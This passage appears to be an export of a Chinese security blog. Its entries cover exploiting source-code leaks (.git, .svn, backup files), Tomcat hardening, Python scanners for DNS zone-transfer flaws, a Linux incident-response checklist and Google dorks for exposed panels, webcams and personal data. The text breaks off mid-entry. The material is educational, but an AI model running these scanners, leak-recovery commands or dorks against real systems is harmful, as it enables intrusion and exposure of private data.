    <content type="text"><![CDATA[在web渗透测试以及CTF中经常可以遇到源码泄露的问题，本文对常见的源码泄露进行了一个总结，有新的姿势持续更新！ 0x00 Mercurial .hg源码泄露hg在初始化代码库的时候，会在当前目录下面产生一个.hg的隐藏文件 e.g.http://www.example.com/.hg/ 利用：工具dvcs-ripper rip-hg.pl -v -u http://www.example.com/.hg 0x01 .git源码泄漏在运行git init初始化的时候，在当前目录下产生一个隐藏的.git文件，这个目录是 Git 用来跟踪管理版本库的，里面存放了所提交的文档索引内容，Git 可以根据该文件夹内的内容对其所管理的文档进行内容跟踪，从而实现版本控制。如果使用者采用复制整个文件夹的方式将.git文件部署。或者其他的错误操作让.git文件暴露在外网环境中，攻击者就可以利用 .git 文件夹内的文件，还原重建工程源代码。 e.g.http://www.example.com/.git/ 利用：工具：GitHack GitHack.py http://www.example.com/.git/该工具其他信息参考：http://www.freebuf.com/sectool/66096.html dvcs-ripper rip-git.pl -v -u http://www.example.com/.git/ 0x02 .DS_Store文件泄漏在发布代码时未删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息。 e.g.http://www.example.com/.ds_store 利用：工具：dsstoreexp python ds_store_exp.py http://www.example.com/.DS_Store 0x03 .svn文件泄漏使用svn版本控制系统时，由于错误操作将.svn文件暴露在外网环境中，即可利用该文件还原出服务器源码、SVN服务器账号密码等信息。 e.g.http://www.example.com/.svn/entries 利用：工具：dvcs-ripper rip-git.pl -v -u http://www.example.com/.git/ Seay-Svn 图形化工具，使用简单 0x04 .CVS文件泄漏利用： http://www.example.com/CVS/Root 返回根信息http://www.example.com/CVS/Entries 返回所有文件的结构bk clone http://www.example.com/test dir 把远端一个名为test的repo clone到本地名为dir的目录下.bk changes 查看所有的改变的命令，转到download的目录 ##0x05 Bazaar/bzrBazaar是一个版本控制系统，可帮助你随时追踪项目的历史，并与他人开展便利地合作。 利用:工具：dvcs-ripper rip-bzr.pl -v -u http://www.example.com/.bzr/ 0x06 备份文件合集：在CTF中，备份文件这个考点经常出现，而在对网站进行修改或者升级过程中也会生成备份文件，如果这些文件未及时删除，而且文件又能被访问到时，就很有可能被恶意下载，利用。常见格式：1234567891011121314151617.php~.un~.swp.rar.zip.7z.tar.gz.tar.gz.~.bak.txt.html.vim.swn.swo.old 0x07 WEB-INF/web.xml泄露WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问WEB-INF主要包含以下文件或目录： /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class。/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。/WEB-INF/database.properties：数据库配置文件。 利用：通过找到web.xml文件，推断class文件路径，最后下载class文件，通过反编译class文件，得到网站源码。 防御：禁止访问WEB-INF目录：location ~ ^/WEB-INF/* { deny all; }]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>源代码泄露</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[burpsuite资源]]></title>
    <url>%2F2017%2F03%2F27%2F10%2F</url>
    <content type="text"><![CDATA[近日发现一本老司机中文版的burpsuite开车指南，分想给大家，另外附上工具一份；而且带有实例说明，适合学习。 补充burpsuite 使用gitbook手册：https://t0data.gitbooks.io/burpsuite感谢作者的贡献~~分享链接http://pan.baidu.com/s/1c2qv5sO 密码：vwfs]]></content>
      <categories>
        <category>神器</category>
      </categories>
      <tags>
        <tag>burpsuite</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Tomcat安全加固]]></title>
    <url>%2F2017%2F03%2F27%2F9%2F</url>
    <content type="text"><![CDATA[总结一些tomcat加固的要点：1、删除$CATALINA_HOME/webapps下默认的所有目录文件。因为线上是不使用 Tomcat 默认提供的管理页面，另外删掉管理页面的两个配置文件host-manager.xml和manager.xml。位于$CATALINA_HOME/conf/Catalina/localhost。2、为了tomcat版本信息泄露，隐藏或者伪装tomcat的版本信息。默认Tomcat的版本信息如下:方法1、解压下图jar包，得到META-INF和org文件，修改org/apache/catalina/util/ServerInfo.properties 文件中的serverinfo字段实现更改tomcat的版本信息修改完之后：方法2、修改$CATALINA_HOME/conf/server.xml，在Connector节点添加server字段。3、用户管理:如果不需要web部署应用，可以注释或者删除tomcat-users.xml下用户权限相关配置 4、如不需要自动部署，关闭自动部$CATALINA_HOME/署功能修改conf/server.xml中的host字段，将下图处修改为：unpackWARs=”false” autoDeploy=”false”。5、启动cookie的httpOnly属性；修改 $CATALINA_HOME/conf/context.xml中添加如下图所示配置：启动cookie的secure属性，只允许cookie在加密方式下传输；在web.xml中sesion-config节点配置cooker-config。6、服务权限控制：tomcat以非root权限启动，应用部署目录权限和tomcat服务启动用户分离，如tomcat以tomcat用户启动，而部署应用的目录设置为nobody用户750.7、AJP端口管理AJP是为 Tomcat 与 HTTP 服务器之间通信而定制的协议，能提供较高的通信速度和效率。如果tomcat前端放的是apache的时候，会使用到AJP这个连接器。前端如果是由nginx做的反向代理的话可以不使用此连接器，因此需要注销掉该连接器。修改如下图所示： 8、禁止列目录：修改web.xml如下图所示 9、自定义错误页面（40X、50X），防止信息泄露： 10、依据实际情况，定义会话超时时间：11、合理设置maxThreads，一般设置为8000以下，如果网址访问量非常大，建议运行多个tomcat做负载均衡处理且需注意jvm的参数配置。当心由于jvm参数过小而崩溃。配置命令在$CATALINA_HOME/conf/server.xml中。12、强烈建议不要使用 Tomcat 的虚拟主机，推荐每个站点使用一个实例。即可以启动多个 Tomcat。里面包含多个虚拟主机。因为tomcat是多线程，共享内存，任何一个虚拟主机中的应用崩溃，都会影响到所有应用程序。虽然采用多实例的方式会产生过多的开销，但至少保障了应用程序的隔离和安全。注意升级过程中：1、避免跨大版本的升级2、将当前老版本tomcat的server.xml(Tomcat主配置文件Server、Service、Engine、Host、Context、Connector)、catalina.sh(配置环境context .xml:指定tomcat和应用的启动路径、java运行时路径、java运行时参数、远程调试参数)web.xml(配置整个tomcat的jsp和servlet工作中的一些情况:servlet、servlet-mapping、session-config、mime-mapping、welcom-file-list、监听器、过滤器、error-page)、tomcat-users.xml(配置用户)文件进行备份，然后部署完新版本的tomcat之后，将这些配置文件覆盖过去即可，再停掉旧版本，启动新版本即可。 ～～]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>Tomcat</tag>
        <tag>安全加固</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DNS域传送漏洞]]></title>
    <url>%2F2017%2F03%2F16%2F8%2F</url>
    <content type="text"><![CDATA[本文将对dns域传送漏洞进行分析与总结，如有错误，欢迎指出。谢谢! 0x00 基础DNS: 网域名称系统（英文：Domain Name System，缩写：DNS）是互联网的一项服务。它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。DNS使用TCP和UDP端口53。当前，对于每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符。12345678常用DNS记录：主机记录(A记录): A记录是用于名称解析的重要记录，它将特定的主机名映射到对应主机的IP地址上。IPv6主机记录(AAAA记录): 与A记录对应，用于将特定的主机名映射到一个主机的IPv6地址。 别名(CNAME记录): CNAME记录用于将某个别名指向到某个A记录上，这样就不需要再为某个新名字另外创建一条新的A记录。电子邮件交换记录（MX记录): 记录一个邮件域名对应的IP地址域名服务器记录 (NS记录): 记录该域名由哪台域名服务器解析反向记录(PTR记录): 也即从IP地址到域名的一条记录TXT记录： 记录域名的相关文本信息 DNS区域传送: DNS服务器分为主服务器、备份服务器和缓存服务器。而域传送指的是一台备用服务器使用来自主服务器的数据更新自己的域（zone）数据库。这为运行中的DNS服务提供了一定的冗余度，其目的是为了防止主的域名服务器因意外故障变得不可用时影响到整个域名的解析。DNS域传送漏洞: 一般DNS区域传送操作只在网络里真的有备用域名DNS服务器时才有必要用到，但许多DNS服务器却被错误地配置成只要有client发出请求，就会向对方提供一个zone数据库的详细信息，即允许不受信任的因特网用户执行DNS区域传送操作。危害: 便于快速判断出某个特定区域的所有主机，获取域信息，如网络拓扑结构、服务器ip地址，为攻击者的入侵提供大量敏感信息。nslookupnslookup是一个网络管理命令行工具，可用于许多计算机操作系统查询域名系统（DNS）以获取域名或IP地址映射或任何其他特定的DNS记录。使用方式非交互式：交互式：digdig是Linux默认自带的DNS拨测工具传送门1234567891011121314151617181920212223242526root@sunu11：~# dig -h Usage: dig [@global-server] [domain] [q-type] [q-class] &#123;q-opt&#125; &#123;global-d-opt&#125; host [@local-server] &#123;local-d-opt&#125; [ host [@local-server] &#123;local-d-opt&#125; [...]] Where: domain is in the Domain Name System q-class is one of (in,hs,ch,...) [default: in] q-type is one of (a,any,mx,ns,soa,hinfo,axfr,txt,...) [default:a] (Use ixfr=version for type ixfr) q-opt is one of: -x dot-notation (shortcut for reverse lookups) -t type (specify query type) d-opt is of the form +keyword[=value], where keyword is: +[no]cmd (Control display of command line) +[no]comments (Control display of comment lines) +[no]question (Control display of question) +[no]answer (Control display of answer) +[no]authority (Control display of authority) +[no]additional (Control display of additional) +[no]stats (Control display of statistics) +[no]short (Disable everything except short form of answer) +[no]all (Set or clear all display flags) global d-opts and servers (before host name) affect all queries. local d-opts and servers (after host name) affect only that lookup. -h (print help and exit) -v (print version and exit) 0x01 实施一、收集dns服务器信息1、手工使用nslookup命令、whois查询等手段进行对某个域名的dns服务器信息的收集2、利用网络空间搜索引擎收集域名服务器信息。如（shadon、zoomeye、fofa等）3、使用MASSCAN 进行端口扫描后，获取开放53号端口的dns服务器地址；请参考使用指南。4、网上存在一些dns社工裤，也可以从中获取所需要的dns服务器信息。 二、检测DNS域传送漏洞1、使用nmap扫描使用如下命令： nmap –script dns-zone-transfer –script-args dns-zone-transfer.domain=xxx -p 53 -Pn dns.xxx 其中dns-zone-transfer.domain参数为指定要查询的域；dns.xxx 为指定的查询域名服务器 2、使用dig命令其中@指定域名服务器；axfr 为域传送指令；xxx.edu.cn表示要查询的域名 3、nslookup命令交互式：12341) 输入nslookup命令进入交互式shell界面;2) server 命令参数设定查询将要使用的DNS服务器;针对某个域名可先输入域名获取dns信息。3) ls命令列出某个域中的所有域名;如果太长不适合查看可定向保存至文件夹中。4) exit命令退出 非交互式方法为了避免和nslookup交换，可以编写一个ls.bat。echo ls %1 | nslookup – %2通过执行ls.bat xxx.edu.cn dns.xxx.edu.cn进行测试。 0x02 拓展单个查询：【使用dztester.py [domain]即可】123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/env python# coding:utf-8# Build by LandGrey 2016-12-03 import re import os import sys def dns_zone_tranfer_finder(domain): print &apos;[+] Nslookup %s&apos; % domain cmd_res = os.popen(&apos;nslookup -type=ns &apos; + domain).read() # fetch DNS Server List dns_servers = re.findall(&apos;nameserver = ([\w\.]+)&apos;, cmd_res) if len(dns_servers) == 0: print &apos;[+] No DNS Server Found!\n&apos; exit(0) for singledns in dns_servers: print &apos;[+] Using @%s&apos; % singledns cmd_res = os.popen(&apos;dig @%s axfr %s&apos; % (singledns, domain)).read() # print cmd_res if cmd_res.find(&apos;XFR size&apos;) &gt; 0: print &apos;[+] Vulnerable dns server found:&apos;, singledns print cmd_res else: print &apos;[+] No Vulnerable found&apos;def usage(): print &apos;[+] Usage: python DZT-tester.py [domain]\n&apos; if __name__ == &quot;__main__&quot;: if len(sys.argv) != 2: usage() elif &apos;-h&apos; in sys.argv[1]: usage() else: domain = sys.argv[1] print &apos;[+] Test %s&apos; % domain dns_zone_tranfer_finder(domain) print &apos;[+] Finished!&apos; 批量查询脚本：脚本同一目录下应有dns-zone-transfer目录；dns-zone-transfer目录下有‘dns’子目录；要检测的域名列表存放在dns-zone-transfer\domain.txt中，一行一个。结果存储在dns-zone-transfer\dns目录和dns-zone-transfer\vulnerable_hosts.txt文件中。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152# coding:utf-8import reimport osimport sysimport threadingdef dns_zone_tranfer_finder(): global c_index while True: lock.acquire() if c_index &gt;= len(DomainLists): lock.release() break domain = DomainLists[c_index].lstrip(&apos;www.&apos;) c_index += 1 lock.release() cmd_res = os.popen(&apos;nslookup -type=ns &apos; + domain).read() # fetch DNS Server List dns_servers = re.findall(&apos;nameserver = ([\w\.]+)&apos;, cmd_res) for server in dns_servers: if len(server) &lt; 5: server += domain cmd_res = os.popen(&apos;dig @%s axfr %s +short&apos; % (server, domain)).read() if cmd_res.find(&apos;XFR size&apos;) &gt; 0 \ and cmd_res.find(&apos;Transfer failed.&apos;) &lt; 0 \ and cmd_res.find(&apos;connection timed out&apos;) &lt; 0: lock.acquire() print &apos;*&apos; * 10 + &apos; Vulnerable dns server found:&apos;, server, &apos;*&apos; * 10 lock.release() with open(os.path.join(currentdir, &apos;dns-zone-transfer&apos;, &apos;vulnerable_hosts.txt&apos;), &apos;a&apos;) as f: f.write(&apos;%s %s\n&apos; % (server.ljust(30), domain)) with open(os.path.join(currentdir, &apos;dns-zone-transfer&apos;, &apos;dns&apos;, server + &apos;.txt&apos;), &apos;w&apos;) as f: f.write(cmd_res)if __name__ == &quot;__main__&quot;: currentdir = os.path.dirname(sys.argv[0]) target = open(os.path.join(currentdir, &apos;dns-zone-transfer&apos;, &apos;domain.txt&apos;)) DomainLists = [] for host in target.readlines(): DomainLists.append(host) print u&apos;采集 %d 个...&apos; % len(DomainLists) threads = [] c_index = 0 lock = threading.Lock() for i in range(10): t = threading.Thread(target=dns_zone_tranfer_finder) t.start() threads.append(t) for t in threads: t.join() print &apos;All Done!&apos; 漏洞存在标识主要是dig命令结果中出现特征字符串“XFR size” 0x03 总结linux系统和windows系统都可以检测出使用的DNS是否存在域传送漏洞，如果存在该漏洞，通过执行命令我们可以清楚的看到整个域下的域名解析信息。解决方案：区域传送是DNS常用的功能，严格限制允许区域传送的主机是解决dns域传送漏洞的有效手段。最后感谢前辈们的文章与辛勤奉献！ 本文作技术研究使用，切勿用本文中的方法违法犯罪！参考链接:李劼杰DNS域传送漏洞系列博客 http://www.lijiejie.com/?s=DNS%E5%9F%9F%E4%BC%A0%E9%80%81%E6%BC%8F%E6%B4%9E&amp;submit=SearchDNS域传送漏洞的收集、检测与利用 http://blog.csdn.net/c465869935/article/details/53444117DNS域传送漏洞利用 https://www.waitalone.cn/dns-domain-transfer-exploits.htmllijiejie/edu-dns-zone-transfer https://github.com/lijiejie/edu-dns-zone-transfer/blob/master/vulnerable_hosts.txt ～～]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>DNS</tag>
        <tag>nslookup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 应急响应总结]]></title>
    <url>%2F2017%2F03%2F01%2F7%2F</url>
    <content type="text"><![CDATA[前言（扯犊子）：做为一名在前线的信息安全从业人员，应急响应技术是必不可缺的，在常见的安全保障模型P2DR模型中，response（响应）占据了其中重要的一个环节。下面是本人学习到的应急响应的一些知识，技巧。一般应急响应流程：整个流程中，尤为重要的莫过于获取安全事件发生后的处理阶段，下面重点总结了一下检查系统是否被入侵以及是否存在后门需要做的一些事情。 检测点（重头戏）：1】日志分析：下面为linux系统中一些重要的日志位置和简单注释。/var/log/messages — 包括整体系统信息，其中也包含系统启动期间的日志。此外，mail，cron，daemon，kern和auth等内容也记录在var/log/messages日志中。/var/log/dmesg — 包含内核缓冲信息（kernel ring buffer）。在系统启动时，会在屏幕上显示许多与硬件有关的信息。可以用dmesg查看它们。/var/log/auth.log — 包含系统授权信息，包括用户登录和使用的权限机制等。/var/log/boot.log — 包含系统启动时的日志。/var/log/daemon.log — 包含各种系统后台守护进程日志信息。/var/log/dpkg.log – 包括安装或dpkg命令清除软件包的日志。/var/log/kern.log – 包含内核产生的日志，有助于在定制内核时解决问题。/var/log/lastlog — 记录所有用户的最近信息。这不是一个ASCII文件，因此需要用lastlog命令查看内容（*关于lastlog命令见注1）。/var/log/maillog /var/log/mail.log — 包含来着系统运行电子邮件服务器的日志信息。例如，sendmail日志信息就全部送到这个文件中。/var/log/user.log — 记录所有等级用户信息的日志。/var/log/Xorg.x.log — 来自X的日志信息。/var/log/alternatives.log – 更新替代信息都记录在这个文件中。/var/log/btmp – 记录所有失败登录信息。使用last命令可以查看btmp文件。例如，”last -f /var/log/btmp | more“。/var/log/cups — 涉及所有打印信息的日志。/var/log/anaconda.log — 在安装Linux时，所有安装信息都储存在这个文件中。/var/log/yum.log — 包含使用yum安装的软件包信息。/var/log/cron — 每当cron进程开始一个工作时，就会将相关信息记录在这个文件中。/var/log/secure — 包含验证和授权方面信息。例如，sshd会将所有信息记录（其中包括失败登录）在这里。/var/log/wtmp或/var/log/utmp — 包含登录信息。使用wtmp可以找出谁正在登陆进入系统，谁使用命令显示这个文件或信息等。/var/log/faillog – 包含用户登录失败信息。此外，错误登录命令也会记录在本文件中。除了上述Log文件以外， /var/log还基于系统的具体应用包含以下一些子目录。/var/log/httpd/或/var/log/apache2 — 包含服务器access_log和error_log信息。/var/log/lighttpd/ — 包含light HTTPD的access_log和error_log。/var/log/mail/ – 这个子目录包含邮件服务器的额外日志。/var/log/prelink/ — 包含.so文件被prelink修改的信息。/var/log/audit/ — 包含被 Linux audit daemon储存的信息。/var/log/samba/ – 包含由samba存储的信息。/var/log/sa/ — 包含每日由sysstat软件包收集的sar文件。/var/log/sssd/ – 用于守护进程安全服务。~/.bash_history - 至关重要的日志，往往黑客会使用history -c清理相关的日志，但此命令并不会清除保存在文件中的记录，因此需要手动删除 .bash_profile文件中的记录。/var/log/sudo.log - 查看SUDO日志在相应的时间段是否出现可疑的用户进行过SU操作另外如果该台主机是做为一台web服务器，还可以审计一下其web服务器的日志，接触比较多的为apache、tomcat、nagix为主。无论哪种web服务器，access_log 和 error_log日志都是值得一看的 。一般find命令可以搞定。 2】用户及用户文件分析1、使用ls -l /etc/passwd查看passwd文件的权限—/etc/passwd默认权限为644即（rw-r–r–)，其最小权限为444(r–r–r–)，首先应对该文件权限进行检查，以确认配置是否正确；然后使用ls -l /etc/shadow 检查shadow文件的权限配置，默认权限为600(rw——-)，最小权限为400(r——–)。2、使用cat /etc/passwd 查看passwd文件内容，判断是否存在可疑账号。3、使用awk -F : &#39;$3==0{print $1}&#39; /etc/passwd 查看是否存在UID为0的用户，该命令表示打印UID=的用户信息。 使用awk &#39;/$1|$6/{print $1}&#39; /etc/shadow 查询远程登录的用户信息 此处存在错误。感谢网友28**1279提醒。经过分析上述命令有误，使用：awk &#39;/\$1|\$6/{print $1}&#39; /etc/shadow 可查询远程登录的用户名。 禁用或者删除多余以及可疑账号：usermod -L user（禁用），/etc/shadow第二栏为！开头 userdel user删除user用户 userdel -r user将删除user用户， 将/home目录下的user目录一并删除passwd文件格式（无密码只允许本机登陆）1root:x:0:0:root:/root:/bin/bash 用户名：密码：用户ID：组ID：用户说明：家目录：登陆之后shellshadow文件格式1root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7::: 用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留 3】系统文件的完整性分析1、查看重要命令的MD5值是否发生改变参数：ls、find、du 、ps、top 、who、last、chsh、passwd、cat、 vi、crontab、netstat等等1)、找到上述命令所使用的文件：which ls find ps last 等等2)、计算MD5的值：md5sum /bin/ls /usr/bin/find /usr/bin/ps 等等3)、与相同版本系统或之前的备份的相应值进行比较。 2、检查包安装后的变化使用RPM命令进行查看，主要查看命令由哪一个包安装，并检查包自安装后文件是否发生过变化。 3、检查系统是否存在ROOTKIT一般检测工具可以使用chkrootkit、rkhunter等（详情请参考http://www.evil0x.com/posts/8146.html）另外：河马 webshell 查杀： http://www.shellpub.com 深信服 Webshell 网站后门检测工具： http://edr.sangfor.com.cn/backdoor_detection.html 4】网络连接1、端口：使用netstat命令查看当前开放的端口信息(netstat -antlp|more)，当然可灵活配合grep命令，获取需要的信息。更多netstat使用姿势可参考http://www.cnblogs.com/ggjucheng/archive/2012/01/08/2316661.html。可以使用lsof -i :port 显示进程和端口的对应关系 2、当前登录用户who查看当前登陆用户（tty本地等了 pts远程登录）执行w查看系统信息,可知道某一时刻用户的行为。uptime查看登录多久，多少用户，负载信息 5】进程和服务1、使用ps -aux查看进程信息。或者使用ps -ef （ps -ef对于反弹shell，更便于发现）2、使用chkconfig -list查看服务启动信息。 6】其他方面：1、定位含有S位权限的文件命令：find / -perm -004000 -type f2、检查最近一段时间内更改的文件find /home/work -type f -mtime T3、查看计划任务crontab -lcd /etc/crontablscrontab -r删除后门自启计划任务4、查看执行过什么命令history 查看root用户的历史命令cat ~/.bash_historyhistory | grep &#39;2017-2-12&#39; 根据时间查看干了什么history | tail -n 5 显示最近5次执行的命令history -c 清空history历史5、查看有没有提权痕迹cat /etc/passwd 极有可能其他用户出现id，组id 0、0的情况lsof -g gid号 通常能找到恶意文件关联的lib文件6、显示最后登录系统的倒数10条记录last -107、离线系统数据：对于现场无法定位的系统，在取得批准后可将问题主机的数据进行镜像拷贝，方便随后进行分析。8、 开机启动项排查：当我们需要开机启动自己的脚本时，只需要将可执行脚本丢在 /etc/init.d目录下，然后在 /etc/rc.d/rc*.d中建立软链接即可ln -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh此处 sshd是具体服务的脚本文件，S100ssh是其软链接，S 开头代表加载时自启动；如果是 K 开头的脚本文件，代表运行级别加载时需要关闭的因此需要对启动项文件进行排查： 12345more /etc/rc.local/etc/rc.d/rc[0~6].dls -l /etc/rc.d/rc3.d/ 9、补充一点加固history信息的知识：1）保存 1 万条命令 sed -i ‘s/^HISTSIZE=1000/HISTSIZE=10000/g’ /etc/profile 2）为历史的命令增加登录的IP地址、执行命令时间等信息：在 /etc/profile的文件尾部添加如下行数配置信息： 12345678910111213141516171819######jiagu history xianshi#########USER_IP=who-uam i 2&gt;/dev/null | awk&apos;&#123;print $NF&#125;&apos;| sed-e&apos;s/[()]//g&apos;if[ &quot;$USER_IP&quot;=&quot;&quot;]thenUSER_IP=hostnamefiexportHISTTIMEFORMAT=&quot;%F %T $USER_IPwhoami &quot;shopt-shistappendexportPROMPT_COMMAND=&quot;history -a&quot;######### jiagu history xianshi ########## 3）source /etc/profile让配置生效生成效果： 1 2018-07-10 19:45:39 192.168.204.1 root source /etc/profile 总结以上是应急响应的一些主要的步骤和流程，希望通过这些总结，给大家带来帮助。如有问题，欢迎留言交流~~ Tips:1、在应急响应中，重要数据的分析工作最好拷贝至工作机器中新建的虚拟机中进行。2、日志信息可以通过重定向来记录结果；在收集前使用du -sh /日志路径 命令判断日志文件大小，过大则根据情况提取特定时间段的日志信息。3、根据情况还可以对流量、数据库、基础网络等方面进行检测排查。 补充一：lastloglastlog文件在每次有用户登录时被查询。可以以root身份运行lastlog命令检查某特定用户上次登录的时间，并格式化输出上次登录日志/var/log/lastlog的内容。它根据UID排序显示登录名、端口号（tty）和上次登录时间。如果一个用户从未登录过，lastlog显示Never logged。*语法lastlog(选项) *选项-b&lt;天数&gt;：显示指定天数前的登录信息&#39;-h：显示召集令的帮助信息;-t&lt;天数&gt;：显示指定天数以来的登录信息;-u&lt;用户名&gt;：显示指定用户的最近登录信息。 二：定时任务异常排查：more /etc/cron.daily/* 查看目录下所有文件原理：1、crontab创建计划任务：crontab -l列出某个用户 cron 服务的详细内容Tips：默认编写的 crontab 文件会保存在 ( /var/spool/cron/用户名例如: /var/spool/cron/root）crontab -r删除每个用户 cront 任务(谨慎：删除所有的计划任务)crontab -e使用编辑器编辑当前的 crontab 文件如:*/1 * * * * echo &quot;hello world&quot; &gt;&gt; /tmp/test.txt每分钟写入文件2、利用 anacron 实现异步定时任务调度 三：服务 服务自启动第一种修改方法：123chkconfig [--level 运行级别][独立服务名][on|off]chkconfig –level 2345 httpd on 开启自启动chkconfig httpd on （默认 level 是 2345） 第二种修改方法： 修改 /etc/re.d/rc.local 文件 加入 /etc/init.d/httpd start 第三种修改方法： 使用 ntsysv 命令管理自启动，可以管理独立服务和 xinetd 服务。 入侵排查 1、查询已安装的服务： RPM 包安装的服务: chkconfig --list查看服务自启动状态，可以看到所有的RPM包安装的服务 ps aux | grep crond查看当前服务 系统在 3 与 5 级别下的启动项 中文环境 chkconfig –list | grep “3:启用|5:启用” 英文环境 chkconfig –list | grep “3:on|5:on” 源码包安装的服务 查看服务安装位置 ，一般是在 /user/local/ service httpd start 搜索 /etc/rc.d/init.d/查看是否存在 四：一些日志分析技巧：1、定位有多少IP在爆破主机的 root 帐号： grep “Failed password for root” /var/log/secure | awk ‘{print $11}’ | sort | uniq -c | sort -nr | more定位有哪些 IP 在爆破：grep “Failed password” /var/log/secure|grep -E -o “(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)”|uniq -c爆破用户名字典是什么？grep “Failed password” /var/log/secure|perl -e ‘while($_=&lt;&gt;){ /for(.*?) from/; print “$1n”;}’|uniq -c|sort -nr 2、登录成功的 IP 有哪些： grep “Accepted “ /var/log/secure | awk ‘{print $11}’ | sort | uniq -c | sort -nr | more 登录成功的日期、用户名、IP： grep “Accepted “ /var/log/secure | awk ‘{print $1,$2,$3,$9,$11}’ 3、增加一个用户 kali 日志：12345Jul1000:12:15localhostuseradd[2382]: newgroup: name=kali, GID=1001Jul1000:12:15localhostuseradd[2382]: newuser: name=kali, UID=1001, GID=1001, home=/home/kali, shell=/bin/bashJul1000:12:58localhostpasswd: pam_unix(passwd:chauthtok): passwordchangedforkali#grep&quot;useradd&quot;/var/log/secure 4、删除用户kali日志：1234567Jul1000:14:17localhostuserdel[2393]: deleteuser&apos;kali&apos;Jul1000:14:17localhostuserdel[2393]: removedgroup&apos;kali&apos; ownedby&apos;kali&apos;Jul1000:14:17localhostuserdel[2393]: removedshadowgroup&apos;kali&apos; ownedby&apos;kali&apos;#grep&quot;userdel&quot;/var/log/secure 5、su 切换用户：1Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0) sudo 授权执行:1sudo -lJul 10 00:43:09 localhost sudo: good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now 参考链接：http://www.sohu.com/a/259254300_649850感谢信安之路《Linux 应急响应流程及实战演练》文章作者等，该文中也有几处应急案例可供参考。]]></content>
      <categories>
        <category>安全服务</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浏览器搜索技巧总结]]></title>
    <url>%2F2017%2F02%2F22%2F6%2F</url>
    <content type="text"><![CDATA[介绍记得以前形容人的能力一般是用智商、情商来形容，但是到了现在这个信息澎湃的时代，搜商也愈来愈发重要，在渗透测试或者其他日常生活中，掌握好搜索技巧经常能事半功倍。下面简单总结一下本人所熟悉的搜索语法： 基础intext: 只搜索网页部分中包含的文字(也就是忽略了标题,URL 等的文字).(管理，)site: 可以限制你搜索范围的域名. ex:site: baidu.com filetype:txt 查找 TXT 文件filetype: 搜索文件的后缀或者扩展名 （doc.mdb.ppt.swf.sql…）allintitle: 搜索所有关键字构成标题的网页. 但是推荐不要使用link: 可以得到一个所有包含了某个指定 URL 的页面列表. 例如:link:www.google.com 就可以得到所有连接到 Google 的页面Intitle or Allintitle: 在页面标题中搜索Related: 显示相关站点inanchor or allinanchor: 搜索范围限制在页面的链接锚点描述文本进行搜索Inurl or Allinurl: 在URL中查找文本（包含大量特殊字符，最为广泛使用）用于搜索网页上包含的 URL. (file,)Phonebook: 搜索电话列表Rphonebook: 搜索住宅电话列表Bphonebook: 商业电话列表Author: 搜索Google中新闻组帖子的作者Group: 搜索Google标题Inanchor: 在链接文本中查找文本Masgid: 通过消息id来查找谷歌的帖子Daterange: 查找某个特定日期范围内发布的网页Insubject: 搜索Googlegroup的主题行Cache: 显示网页的缓存版本Stocks: 搜索股票信息Info: 显示Google的摘要信息Define: 显示某术语的定义Numrang: 搜索数字需要两个参数一个最小数，一个最大数，用破折号隔开+ 加入被忽略的词- 忽略排除某个词~ 同意词即类似的词. 单一的通配符* 通配符，可代表多个字母“ ” 精确查询匹配布尔操作:and 与or 或not 不 利用12&quot;Welcome to phpmyadmin ***&quot; &quot;running on * as root@*&quot; intitle:phpmyadmin&quot;mysql error with query&quot; 数据库程序和错误文件 “Assessment report” “nessus” filetype:pdf 安全扫描报告 “advanced guestbook * powered” inurl:addentry.phpintitle:”View img” inurl:viewimg.php 程序中含有SQL注入漏洞并且路径可以修改弱口 “php version” intitle:phpinfo inurl:info.php 敏感信息 intitle:”usage Statistics(统计表) for” intext:”Total Unique Usernames” 用户姓名 intitle:CV OR intitle:Lebenslauf “thomas fischer”intitle:CV OR intitle:Lebenslauf ext:pdf OR ext:doc 个人简历 allintext: name email phone address intext:”thomas fischer(人物)” ext:pdfTwiki inurl:”View/Main” “thomas fischer” 描述标识私人的信息(姓名，地址，电话，电话分机) intitle:”live View/ -AXIS” | inurl:view/view.shtmlinurl:”ViewFrame?Mode=”inurl:”MultiCameraFrame?Mode=”inturl:”axis-cgi/mjpg”intext:”MOBOTIX M1″intext:”Open Menu”inurl:”view/index.shtml” 在线网络摄像头 “index of” (private | secure | geheim | gizli)“robots.txt” “User-agent” ext:txt“this document is private | confidential| secret” ext:doc | ext:pdf | ext:xlsintitle:”index of” “jpg | png | bmp” inurl”personal | 